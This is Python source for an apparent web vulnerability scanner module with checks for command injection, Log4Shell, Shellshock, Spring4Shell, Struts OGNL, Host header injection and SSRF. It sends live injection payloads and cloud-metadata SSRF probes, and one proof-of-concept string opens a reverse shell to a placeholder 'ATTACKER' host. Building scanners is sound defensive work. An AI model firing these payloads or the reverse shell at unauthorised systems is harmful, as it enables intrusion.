"""
CVE and generic exploit checks — covers gaps in OWASP Top 10 2021:

  - CommandInjectionCheck     : A03 OS command injection (timing + output)
  - CookieSecurityCheck       : A02 insecure cookie flags (passive)
  - HostHeaderInjectionCheck  : A01 Host header reflection / password reset poisoning
  - Log4ShellCheck            : CVE-2021-44228 JNDI injection in headers
  - ShellshockCheck           : CVE-2014-6271 Bash env var CGI injection (timing)
  - SpringShellCheck          : CVE-2022-22965 Spring classloader RCE
  - StrutsOgnlCheck           : CVE-2017-5638 Apache Struts2 OGNL injection
  - ComponentVersionCheck     : A06 known-vulnerable component detection (passive)
  - GenericSsrfCheck          : A10 SSRF via any URL parameter (not just Juice Shop)
  - InsecureDeserCheck        : A08 Java/PHP deserialization payloads in parameters
"""
import re
import time
import uuid
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
    CrawlResult,
)
from .base import BaseScanCheck


# ---------------------------------------------------------------------------
# OS Command Injection (A03)
# ---------------------------------------------------------------------------

# Payloads: (unix_payload, windows_payload, expected_output_pattern)
_CMDI_SLEEP_PAYLOADS = [
    # Unix: semicolon, pipe, backtick, $() — Windows: & and |
    ("; sleep {delay}", "& timeout /t {delay} /nobreak", None),
    ("| sleep {delay}", "| timeout /t {delay} /nobreak", None),
    ("` sleep {delay}`", None, None),
    ("$(sleep {delay})", None, None),
    ("\n sleep {delay}\n", None, None),
]

_CMDI_OUTPUT_PAYLOADS = [
    # Inject canary via shell command output — check if it appears in response
    ("; echo CMDI{canary}", "& echo CMDI{canary}", r"CMDI[A-Za-z0-9]+"),
    ("| echo CMDI{canary}", None, r"CMDI[A-Za-z0-9]+"),
    ("$(echo CMDI{canary})", None, r"CMDI[A-Za-z0-9]+"),
    ("\n echo CMDI{canary}\n", None, r"CMDI[A-Za-z0-9]+"),
    ("`echo CMDI{canary}`", None, r"CMDI[A-Za-z0-9]+"),
]


class CommandInjectionCheck(BaseScanCheck):
    """
    Detects OS command injection via two strategies:
    1. Output-based: inject '; echo CMDI<canary>' — canary appears in response
    2. Timing-based: inject '; sleep 5' with 2× confirmation (sleep 5 vs sleep 0)
    Works on any web application, not Juice Shop specific.
    """
    check_id = "cmdi"
    check_type = CheckType.ACTIVE
    name = "OS Command Injection"
    description = "Detects OS command injection via shell metacharacters in parameters"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if insertion_point.ip_type not in (
            IPType.QUERY_PARAM, IPType.BODY_PARAM, IPType.JSON_KEY
        ):
            return []

        # Skip obviously non-injectable params (numeric IDs, booleans)
        if insertion_point.value.isdigit() or insertion_point.value.lower() in (
            "true", "false", "null", "none", "0", "1"
        ):
            return []

        # --- Strategy 1: Output-based (preferred — no false positives) ---
        canary = uuid.uuid4().hex[:8]
        for unix_tmpl, win_tmpl, pattern in _CMDI_OUTPUT_PAYLOADS:
            unix_payload = unix_tmpl.format(canary=canary)
            payload_val = insertion_point.value + unix_payload

            try:
                resp = await self._send(insertion_point, client, payload_val)
                if resp and re.search(r"CMDI" + canary, resp.text):
                    # Anti-FP: if the canary only appears as "echo CMDI{canary}"
                    # the server is reflecting the input, not executing it.
                    # Genuine execution outputs CMDI{canary} standalone (not preceded by "echo ").
                    body = resp.text
                    # Find all occurrences of the canary
                    idx = body.find("CMDI" + canary)
                    if idx == -1:
                        continue
                    # Check that at least one occurrence is NOT immediately preceded by "echo "
                    has_real_output = False
                    search_start = 0
                    while True:
                        pos = body.find("CMDI" + canary, search_start)
                        if pos == -1:
                            break
                        prefix = body[max(0, pos - 5):pos].lower()
                        if "echo " not in prefix:
                            has_real_output = True
                            break
                        search_start = pos + 1
                    if not has_real_output:
                        continue
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.CRITICAL,
                        cvss=9.8,
                        description=(
                            f"OS Command Injection confirmed (output-based)! "
                            f"Parameter {insertion_point.name!r} at {insertion_point.url} "
                            f"executed shell command. Canary 'CMDI{canary}' returned in response. "
                            f"Full OS command execution possible — RCE achieved."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"{insertion_point.method} {insertion_point.url} "
                                f"[{insertion_point.name}={payload_val!r}]"
                            ),
                            response=resp,
                            payload=payload_val,
                            poc_curl=(
                                f"curl -s '{insertion_point.url}' "
                                f"-d '{insertion_point.name}=; id'"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                pass

        # --- Strategy 2: Timing-based (double-confirm: sleep 5 vs sleep 0) ---
        try:
            # Baseline: sleep 0
            t0 = time.monotonic()
            await self._send(insertion_point, client, insertion_point.value + "; sleep 0")
            baseline = time.monotonic() - t0

            # Probe: sleep 5
            t0 = time.monotonic()
            await self._send(insertion_point, client, insertion_point.value + "; sleep 5")
            probe_time = time.monotonic() - t0

            if probe_time >= 4.5 and probe_time > baseline + 3.0:
                # Confirmation: sleep 3 (should be ~3s, not instant)
                t0 = time.monotonic()
                resp = await self._send(insertion_point, client, insertion_point.value + "; sleep 3")
                confirm_time = time.monotonic() - t0

                if confirm_time >= 2.5:
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.FIRM,
                        severity=Severity.CRITICAL,
                        cvss=9.8,
                        description=(
                            f"OS Command Injection (timing-based)! "
                            f"Parameter {insertion_point.name!r} at {insertion_point.url}: "
                            f"sleep 5 took {probe_time:.1f}s (baseline {baseline:.1f}s), "
                            f"sleep 3 confirmed at {confirm_time:.1f}s. "
                            f"RCE likely — use output-based payload to confirm further."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"{insertion_point.method} {insertion_point.url} "
                                f"[{insertion_point.name}=...;sleep 5]"
                            ),
                            response=resp,
                            payload=f"sleep 5 → {probe_time:.2f}s | sleep 3 → {confirm_time:.2f}s",
                            poc_curl=(
                                f"# Time the response:\n"
                                f"time curl -s '{insertion_point.url}' "
                                f"-d '{insertion_point.name}=x;sleep+5'"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]
        except Exception:
            pass

        return []

    async def _send(
        self,
        ip: InsertionPoint,
        client: httpx.AsyncClient,
        value: str,
    ) -> httpx.Response | None:
        try:
            if ip.ip_type == IPType.QUERY_PARAM:
                url = self._build_url(ip, value)
                return await client.request(ip.method, url)
            elif ip.ip_type in (IPType.BODY_PARAM,):
                return await client.request(
                    ip.method, ip.url,
                    data={ip.name: value},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
            elif ip.ip_type == IPType.JSON_KEY:
                return await client.request(
                    ip.method, ip.url,
                    json={ip.name: value},
                    headers={"Content-Type": "application/json"},
                )
        except Exception:
            return None
        return None


# ---------------------------------------------------------------------------
# Cookie Security Flags (A02) — Passive
# ---------------------------------------------------------------------------

class CookieSecurityCheck(BaseScanCheck):
    """
    Passive check: analyses Set-Cookie headers for missing security flags.
    Missing Secure → cookie sent over HTTP (sniffable).
    Missing HttpOnly → XSS can steal cookie via document.cookie.
    Missing SameSite=Strict/Lax → CSRF possible.
    """
    check_id = "cookie-security"
    check_type = CheckType.PASSIVE
    name = "Insecure Cookie Flags"
    description = "Checks Set-Cookie headers for missing Secure, HttpOnly, SameSite flags"

    async def check_passive(self, crawl_result: CrawlResult) -> list[CheckResult]:
        results = []
        # Collect all Set-Cookie headers (may be multiple)
        set_cookie_values = []
        for k, v in crawl_result.headers.items():
            if k.lower() == "set-cookie":
                set_cookie_values.append(v)

        # httpx may fold multiple Set-Cookie into comma-separated (non-standard)
        if not set_cookie_values:
            return []

        for cookie_str in set_cookie_values:
            cookie_lower = cookie_str.lower()
            name = cookie_str.split("=")[0].strip() if "=" in cookie_str else cookie_str[:20]

            # Only flag session-looking cookies (token, session, auth, jwt, sid)
            is_session_cookie = any(
                k in name.lower() for k in
                ("token", "session", "sess", "auth", "jwt", "sid", "connect.sid", "phpses")
            )

            missing = []
            if "secure" not in cookie_lower:
                missing.append("Secure")
            if "httponly" not in cookie_lower:
                missing.append("HttpOnly")
            if "samesite" not in cookie_lower:
                missing.append("SameSite")

            if not missing:
                continue

            severity = Severity.LOW
            cvss = 4.3
            if is_session_cookie:
                if "HttpOnly" in missing and "Secure" in missing:
                    severity = Severity.HIGH
                    cvss = 7.4
                elif "HttpOnly" in missing or "Secure" in missing:
                    severity = Severity.MEDIUM
                    cvss = 6.1

            results.append(CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=Confidence.CERTAIN,
                severity=severity,
                cvss=cvss,
                description=(
                    f"Cookie {name!r} is missing flag(s): {', '.join(missing)}. "
                    + ("Missing HttpOnly → XSS can steal via document.cookie. " if "HttpOnly" in missing else "")
                    + ("Missing Secure → cookie transmitted over HTTP (sniffable). " if "Secure" in missing else "")
                    + ("Missing SameSite → susceptible to CSRF attacks." if "SameSite" in missing else "")
                ),
                evidence=self._make_evidence(
                    request_raw=f"GET {crawl_result.url} HTTP/1.1",
                    payload=cookie_str[:200],
                    poc_curl=f"curl -sI '{crawl_result.url}' | grep -i set-cookie",
                ),
                insertion_point=None,
            ))

        return results


# ---------------------------------------------------------------------------
# Host Header Injection (A01)
# ---------------------------------------------------------------------------

class HostHeaderInjectionCheck(BaseScanCheck):
    """
    Tests for Host header injection — can lead to:
    - Password reset link poisoning (attacker's domain in reset email)
    - Cache poisoning
    - SSRF via internal routing

    Sends requests with forged Host / X-Forwarded-Host headers and checks
    if the evil domain is reflected in response body or Location header.
    """
    check_id = "host-header-injection"
    check_type = CheckType.ACTIVE
    name = "Host Header Injection"
    description = "Detects Host header reflection enabling password-reset poisoning and cache poisoning"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        canary = f"evil-{uuid.uuid4().hex[:8]}.attacker.com"

        test_paths = ["/", "/forgot-password", "/reset-password", "/auth/forgot", "/api/forgot"]
        override_headers = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-HTTP-Host-Override"]

        for path in test_paths:
            url = base + path
            for hdr in override_headers:
                try:
                    resp = await client.get(
                        url,
                        headers={hdr: canary, "Host": parsed.netloc},
                    )
                    if resp.status_code in (200, 301, 302, 404) and canary in resp.text:
                        return [CheckResult(
                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=Confidence.CERTAIN,
                            severity=Severity.HIGH,
                            cvss=8.1,
                            description=(
                                f"Host header injection confirmed! {hdr}: {canary} "
                                f"was reflected in the response body at {url}. "
                                f"Attacker can poison password-reset emails, "
                                f"cache responses with malicious links, or pivot to internal hosts."
                            ),
                            evidence=self._make_evidence(
                                request_raw=(
                                    f"GET {path} HTTP/1.1\n"
                                    f"Host: {parsed.netloc}\n"
                                    f"{hdr}: {canary}"
                                ),
                                response=resp,
                                payload=f"{hdr}: {canary}",
                                poc_curl=(
                                    f"curl -s '{url}' "
                                    f"-H '{hdr}: {canary}' "
                                    f"| grep '{canary}'"
                                ),
                            ),
                            insertion_point=insertion_point,
                        )]

                    # Also check Location header on redirects
                    loc = resp.headers.get("location", "")
                    if canary in loc:
                        return [CheckResult(
                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=Confidence.CERTAIN,
                            severity=Severity.HIGH,
                            cvss=8.1,
                            description=(
                                f"Host header injection in redirect! {hdr}: {canary} "
                                f"appeared in Location: {loc!r}. "
                                f"Password reset links will point to attacker's domain."
                            ),
                            evidence=self._make_evidence(
                                request_raw=f"GET {path} HTTP/1.1\n{hdr}: {canary}",
                                response=resp,
                                payload=f"{hdr}: {canary} → Location: {loc}",
                                poc_curl=f"curl -sI '{url}' -H '{hdr}: {canary}'",
                            ),
                            insertion_point=insertion_point,
                        )]
                except Exception:
                    continue

        return []


# ---------------------------------------------------------------------------
# CVE-2021-44228 Log4Shell — JNDI Injection in HTTP Headers
# ---------------------------------------------------------------------------

class Log4ShellCheck(BaseScanCheck):
    """
    CVE-2021-44228: Log4j JNDI lookup injection.
    Injects ${jndi:ldap://...} payloads into common HTTP headers.
    Without an OAST callback server, detects via error/response change.
    FIRM confidence without out-of-band — CERTAIN requires OAST DNS callback.
    """
    check_id = "cve-2021-44228-log4shell"
    check_type = CheckType.ACTIVE
    name = "Log4Shell (CVE-2021-44228)"
    description = "Detects Log4j JNDI injection via User-Agent and other headers"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        canary = uuid.uuid4().hex[:12]

        # Various bypass obfuscations in addition to plain payload
        payloads = [
            f"${{jndi:ldap://127.0.0.1:1389/{canary}}}",
            f"${{${{lower:j}}${{lower:n}}${{lower:d}}${{lower:i}}:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://127.0.0.1:1389/{canary}}}",
            f"${{jndi:dns://127.0.0.1:5353/{canary}}}",
            f"${{jndi:rmi://127.0.0.1:1099/{canary}}}",
        ]

        # Headers where Log4j often logs user-supplied values
        injectable_headers = [
            "User-Agent",
            "X-Forwarded-For",
            "X-Api-Version",
            "X-Request-Id",
            "Referer",
            "Origin",
            "Accept-Language",
            "Accept",
        ]

        baseline_resp = None
        try:
            baseline_resp = await client.get(base + "/", headers={"User-Agent": f"NexusCheck-{canary}"})
        except Exception:
            pass

        for payload in payloads[:1]:  # One payload per scan to avoid noise
            for header in injectable_headers[:3]:  # Top 3 most common injection points
                try:
                    resp = await client.get(
                        base + "/",
                        headers={header: payload},
                    )
                    # Detect: server error triggered by JNDI lookup failure
                    if resp.status_code == 500 and baseline_resp and baseline_resp.status_code != 500:
                        error_indicators = ["jndi", "log4j", "ldap", "lookup", "NamingException",
                                            "CommunicationsException", "ConnectException"]
                        if any(ind.lower() in resp.text.lower() for ind in error_indicators):
                            return [CheckResult(
                                check_id=self.check_id,
                                vulnerable=True,
                                confidence=Confidence.FIRM,
                                severity=Severity.CRITICAL,
                                cvss=10.0,
                                description=(
                                    f"Log4Shell (CVE-2021-44228) likely vulnerable! "
                                    f"JNDI payload in {header} header caused HTTP 500 with JNDI/LDAP error. "
                                    f"Unpatched Log4j versions 2.0–2.14.1 are susceptible to RCE. "
                                    f"Confirm with OAST/DNS callback for CERTAIN confidence."
                                ),
                                evidence=self._make_evidence(
                                    request_raw=f"GET / HTTP/1.1\n{header}: {payload}",
                                    response=resp,
                                    payload=payload,
                                    poc_curl=(
                                        f"curl -s '{base}/' "
                                        f"-H '{header}: ${{jndi:ldap://OAST_HOST/{canary}}}'"
                                    ),
                                ),
                                insertion_point=insertion_point,
                            )]

                    # Detect: significant response time increase (JNDI connects to external host)
                except Exception:
                    continue

        return []


# ---------------------------------------------------------------------------
# CVE-2014-6271 Shellshock — Bash CGI Injection (Timing)
# ---------------------------------------------------------------------------

class ShellshockCheck(BaseScanCheck):
    """
    CVE-2014-6271: Bash processes HTTP headers as environment variables.
    CGI scripts executed via bash will run arbitrary commands embedded in
    User-Agent, Cookie, Referer, etc.
    Detection: timing-based (sleep 5 vs sleep 0) with double-confirmation.
    Primarily relevant for CGI-based apps (Apache/nginx + cgi-bin).
    """
    check_id = "cve-2014-6271-shellshock"
    check_type = CheckType.ACTIVE
    name = "Shellshock (CVE-2014-6271)"
    description = "Detects bash CGI injection via environment variable headers"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # CGI paths where shellshock is most likely
        cgi_paths = ["/", "/cgi-bin/test", "/cgi-bin/status", "/cgi-bin/test-cgi",
                     "/cgi-bin/printenv", "/cgi-bin/env"]

        shellshock_headers = {
            "User-Agent": "() {{ :;}}; sleep {delay}",
            "Cookie":     "() {{ :;}}; sleep {delay}",
            "Referer":    "() {{ :;}}; sleep {delay}",
        }

        for path in cgi_paths[:3]:
            url = base + path
            for header, tmpl in shellshock_headers.items():
                try:
                    # Baseline
                    t0 = time.monotonic()
                    await client.get(url, headers={header: tmpl.format(delay=0)})
                    baseline = time.monotonic() - t0

                    # Probe: sleep 5
                    t0 = time.monotonic()
                    resp = await client.get(url, headers={header: tmpl.format(delay=5)})
                    probe_time = time.monotonic() - t0

                    if probe_time >= 4.5 and probe_time > baseline + 3.0:
                        # Confirm: sleep 3
                        t0 = time.monotonic()
                        await client.get(url, headers={header: tmpl.format(delay=3)})
                        confirm_time = time.monotonic() - t0

                        if confirm_time >= 2.5:
                            return [CheckResult(
                                check_id=self.check_id,
                                vulnerable=True,
                                confidence=Confidence.FIRM,
                                severity=Severity.CRITICAL,
                                cvss=9.8,
                                description=(
                                    f"Shellshock (CVE-2014-6271) likely vulnerable at {url}! "
                                    f"sleep 5 via {header} header took {probe_time:.1f}s "
                                    f"(baseline {baseline:.1f}s), confirmed at {confirm_time:.1f}s. "
                                    f"Bash CGI injection → unauthenticated RCE."
                                ),
                                evidence=self._make_evidence(
                                    request_raw=(
                                        f"GET {path} HTTP/1.1\n"
                                        f"{header}: () {{{{ :;}}}}; sleep 5"
                                    ),
                                    response=resp,
                                    payload=f"() {{ :;}}; sleep 5 (timing: {probe_time:.2f}s)",
                                    poc_curl=(
                                        f"curl -s '{url}' "
                                        f"-H '{header}: () {{ :;}}; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
                                    ),
                                ),
                                insertion_point=insertion_point,
                            )]
                except Exception:
                    continue

        return []


# ---------------------------------------------------------------------------
# CVE-2022-22965 Spring4Shell — Spring Framework RCE
# ---------------------------------------------------------------------------

class SpringShellCheck(BaseScanCheck):
    """
    CVE-2022-22965: Spring Framework data binding vulnerability.
    Attacker can modify Tomcat log configuration to write a JSP webshell.
    Detection: POST with classloader manipulation params → check for Spring errors.
    Most effective on Spring Boot apps on Tomcat with JDK 9+.
    """
    check_id = "cve-2022-22965-spring4shell"
    check_type = CheckType.ACTIVE
    name = "Spring4Shell (CVE-2022-22965)"
    description = "Detects Spring Framework classloader RCE via parameter binding"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        canary = uuid.uuid4().hex[:8]

        # Spring indicator: X-Application-Context header or Spring error pages
        spring_indicators = [
            "spring", "springframework", "Whitelabel Error Page",
            "application/json", "X-Application-Context",
        ]

        # Quick check: is this a Spring app?
        is_spring = False
        try:
            r = await client.get(base + "/")
            resp_text = r.text + " ".join(f"{k}: {v}" for k, v in r.headers.items())
            is_spring = any(ind.lower() in resp_text.lower() for ind in spring_indicators)
        except Exception:
            pass

        if not is_spring:
            return []

        # Spring4Shell exploit probe (detection only — does not write shell)
        # Checks if classloader manipulation is accepted
        spring_params = {
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": canary,
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": f"shell_{canary}",
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
        }

        test_paths = ["/", "/login", "/api/login", "/actuator/health"]
        for path in test_paths:
            url = base + path
            try:
                resp = await client.post(
                    url,
                    data=spring_params,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                # Spring4Shell: server accepts classloader params without error (200 OK)
                # Patched Spring: returns 400 Bad Request for these params
                if resp.status_code == 200:
                    # Check if response doesn't contain error about the param
                    if "Invalid property" not in resp.text and "PropertyAccessException" not in resp.text:
                        return [CheckResult(
                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=Confidence.TENTATIVE,
                            severity=Severity.CRITICAL,
                            cvss=9.8,
                            description=(
                                f"Spring4Shell (CVE-2022-22965) possible at {url}! "
                                f"Spring application accepted classloader parameter binding without error. "
                                f"Unpatched Spring Framework 5.3.0–5.3.17 / 5.2.0–5.2.19 on Tomcat + JDK9+ "
                                f"is vulnerable to RCE. Verify manually — TENTATIVE confidence."
                            ),
                            evidence=self._make_evidence(
                                request_raw=(
                                    f"POST {path} HTTP/1.1\n"
                                    f"Content-Type: application/x-www-form-urlencoded\n\n"
                                    f"class.module.classLoader.resources.context.parent..."
                                ),
                                response=resp,
                                payload="class.module.classLoader.resources.context.parent.pipeline.first.pattern",
                                poc_curl=(
                                    f"curl -s -X POST '{url}' "
                                    f"-d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=test'"
                                    f"# Patched returns 400; vulnerable returns 200"
                                ),
                            ),
                            insertion_point=insertion_point,
                        )]
                elif resp.status_code == 400:
                    # 400 on classloader params = patched
                    return []
            except Exception:
                pass

        return []


# ---------------------------------------------------------------------------
# CVE-2017-5638 Apache Struts2 OGNL Injection
# ---------------------------------------------------------------------------

class StrutsOgnlCheck(BaseScanCheck):
    """
    CVE-2017-5638: Apache Struts2 Jakarta Multipart parser OGNL injection.
    Malicious Content-Type header triggers OGNL expression evaluation.
    Detection: inject benign OGNL that returns a known value + canary.
    """
    check_id = "cve-2017-5638-struts-ognl"
    check_type = CheckType.ACTIVE
    name = "Apache Struts2 OGNL RCE (CVE-2017-5638)"
    description = "Detects Struts2 Jakarta multipart parser OGNL injection"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Struts is typically found at .action / .do URLs
        struts_paths = ["/index.action", "/login.action", "/upload.action",
                        "/struts/", "/WEB-INF/", "/", "/index.do"]

        # Detection payload — benign: just returns concat of strings
        # Uses OGNL string concat to detect expression evaluation without RCE
        canary = uuid.uuid4().hex[:8]
        detect_payload = (
            f"%{{\"Struts2-{canary}\".toString()}}"
        )

        for path in struts_paths[:4]:
            url = base + path
            try:
                resp = await client.post(
                    url,
                    content=b"test",
                    headers={"Content-Type": detect_payload},
                )
                # Vulnerable: Struts evaluates OGNL and may reflect result or error
                # Also check for Struts-specific error pages
                if (f"Struts2-{canary}" in resp.text or
                        any(s in resp.text for s in [
                            "struts.action.name", "ognl.OgnlException",
                            "com.opensymphony.xwork2", "No result defined"
                        ])):
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.FIRM,
                        severity=Severity.CRITICAL,
                        cvss=10.0,
                        description=(
                            f"Apache Struts2 OGNL injection (CVE-2017-5638) at {url}! "
                            f"OGNL expression in Content-Type header evaluated. "
                            f"Full RCE possible — attacker can execute arbitrary OS commands."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"POST {path} HTTP/1.1\n"
                                f"Content-Type: {detect_payload[:100]}"
                            ),
                            response=resp,
                            payload=detect_payload,
                            poc_curl=(
                                f"curl -s -X POST '{url}' "
                                f"-H 'Content-Type: %{{(#cmd=(\\\"id\\\")).(#iswin=...)}}'  "
                                f"# Full CVE-2017-5638 PoC"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue

        return []


# ---------------------------------------------------------------------------
# Component Version Detection (A06 Vulnerable and Outdated Components) — Passive
# ---------------------------------------------------------------------------

# Known vulnerable version patterns: (pattern, component, min_safe_version, cve, severity)
_VULNERABLE_COMPONENTS: list[tuple[re.Pattern, str, str, str, Severity]] = [
    (re.compile(r"Apache/2\.[0-3]\.", re.I),     "Apache httpd",  "2.4.56", "Multiple CVEs",      Severity.HIGH),
    (re.compile(r"nginx/1\.(1[0-7]|[0-9])\.",    re.I),           "nginx",   "1.24.0", "Multiple CVEs", Severity.MEDIUM),
    (re.compile(r"PHP/([0-7]\.|8\.0\.|8\.1\.[0-9]\b)", re.I), "PHP", "8.1.20", "Multiple CVEs",   Severity.HIGH),
    (re.compile(r"Express/([0-3]\.|4\.[0-9]\b)", re.I),           "Express", "4.18.2", "Multiple CVEs", Severity.MEDIUM),
    (re.compile(r"struts[/ ]([12]\.[0-2])",       re.I),           "Struts2", "2.5.33", "CVE-2017-5638", Severity.CRITICAL),
    (re.compile(r"log4j[/ ](2\.(?:0|1[0-4])\b)", re.I),           "Log4j",   "2.17.1", "CVE-2021-44228", Severity.CRITICAL),
    (re.compile(r"spring[/ ](5\.[0-2]\.|4\.)",    re.I),           "Spring",  "5.3.27", "CVE-2022-22965", Severity.CRITICAL),
    (re.compile(r"jQuery/(1\.[0-9]\.|2\.[0-2]\.)", re.I),         "jQuery",  "3.7.0",  "XSS CVEs",       Severity.MEDIUM),
    (re.compile(r"jquery[/ ](1\.[0-9]\.|2\.[0-2]\.)", re.I),     "jQuery",  "3.7.0",  "XSS CVEs",       Severity.MEDIUM),
    (re.compile(r"OpenSSL/1\.[0-1]\.",            re.I),           "OpenSSL", "3.0.0",  "Heartbleed+",    Severity.CRITICAL),
    (re.compile(r"bootstrap/([12]\.|3\.[0-3]\.)", re.I),          "Bootstrap","5.2.3", "XSS CVEs",       Severity.LOW),
    (re.compile(r"tomcat/([0-8]\.|9\.[0-7]\.)",   re.I),           "Tomcat",  "10.1.7", "Multiple CVEs",  Severity.HIGH),
]


class ComponentVersionCheck(BaseScanCheck):
    """
    Passive: scans Server, X-Powered-By, Via, and response body for known
    vulnerable component version strings and cross-references against known CVEs.
    """
    check_id = "vulnerable-component"
    check_type = CheckType.PASSIVE
    name = "Vulnerable/Outdated Component"
    description = "Detects known-vulnerable software versions via header and body analysis"

    async def check_passive(self, crawl_result: CrawlResult) -> list[CheckResult]:
        results = []
        # Scan: response headers + body (JS includes often disclose versions)
        scan_text = (
            " ".join(f"{k}: {v}" for k, v in crawl_result.headers.items())
            + " " + crawl_result.body[:8192]
        )

        seen: set[str] = set()
        for pattern, component, safe_ver, cve, severity in _VULNERABLE_COMPONENTS:
            m = pattern.search(scan_text)
            if m and component not in seen:
                seen.add(component)
                matched = m.group(0)
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.FIRM,
                    severity=severity,
                    cvss=9.8 if severity == Severity.CRITICAL else 7.5 if severity == Severity.HIGH else 5.3,
                    description=(
                        f"Outdated/vulnerable component detected: {component} ({matched!r}). "
                        f"Safe version: {safe_ver}+. Related CVE(s): {cve}. "
                        f"Update immediately — known public exploits exist."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET {crawl_result.url} HTTP/1.1",
                        payload=matched,
                        poc_curl=f"curl -sI '{crawl_result.url}' | grep -Ei 'server|x-powered-by|via'",
                    ),
                    insertion_point=None,
                ))

        return results


# ---------------------------------------------------------------------------
# Generic SSRF — works on any web app (not Juice Shop specific)
# ---------------------------------------------------------------------------

_SSRF_CANARY_PATHS = [
    "http://169.254.169.254/latest/meta-data/",          # AWS IMDSv1
    "http://169.254.169.254/computeMetadata/v1/",        # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://localhost:80/",
    "http://[::1]:80/",
    "http://0.0.0.0:80/",
]

_AWS_INDICATORS = [
    "ami-id", "instance-id", "local-ipv4", "iam/", "security-credentials",
    "placement/", "hostname", "public-ipv4",
]

_GCP_INDICATORS = ["computeMetadata", "project-id", "instance", "service-accounts"]


class GenericSsrfCheck(BaseScanCheck):
    """
    Generic SSRF check for any target — sends internal/metadata URLs as the
    value of URL-type parameters (imageUrl, url, target, redirect, etc.).
    Confirms by checking if cloud metadata or internal service content appears
    in the response.
    """
    check_id = "ssrf-generic"
    check_type = CheckType.ACTIVE
    name = "Generic SSRF (Cloud Metadata / Internal)"
    description = "Detects SSRF in URL parameters by probing cloud metadata and internal endpoints"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        name_lower = insertion_point.name.lower()
        url_lower = insertion_point.url.lower()

        # Only test URL-like parameters
        url_param_names = (
            "url", "imageurl", "image_url", "avatar", "avatarurl", "photo",
            "redirect", "redirect_url", "next", "target", "dest", "destination",
            "callback", "callback_url", "webhook", "hook_url", "fetch", "proxy",
            "link", "src", "source", "endpoint", "api_url",
        )
        is_url_param = any(k in name_lower for k in url_param_names)
        is_url_endpoint = any(k in url_lower for k in ("/fetch", "/proxy", "/webhook", "/image/url"))

        if not (is_url_param or is_url_endpoint):
            return []

        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        for ssrf_url in _SSRF_CANARY_PATHS:
            try:
                resp = await self._send_url(insertion_point, client, ssrf_url)
                if resp is None:
                    continue

                resp_text = resp.text
                # Check AWS metadata
                if any(ind in resp_text for ind in _AWS_INDICATORS):
                    return [self._make_ssrf_finding(insertion_point, ssrf_url, resp, "AWS IMDSv1 metadata")]
                # Check GCP metadata
                if any(ind in resp_text for ind in _GCP_INDICATORS):
                    return [self._make_ssrf_finding(insertion_point, ssrf_url, resp, "GCP metadata")]
                # Check internal service (200 on localhost with content = SSRF)
                if "127.0.0.1" in ssrf_url and resp.status_code == 200 and len(resp.text) > 50:
                    return [self._make_ssrf_finding(insertion_point, ssrf_url, resp, "internal localhost")]
            except Exception:
                continue

        return []

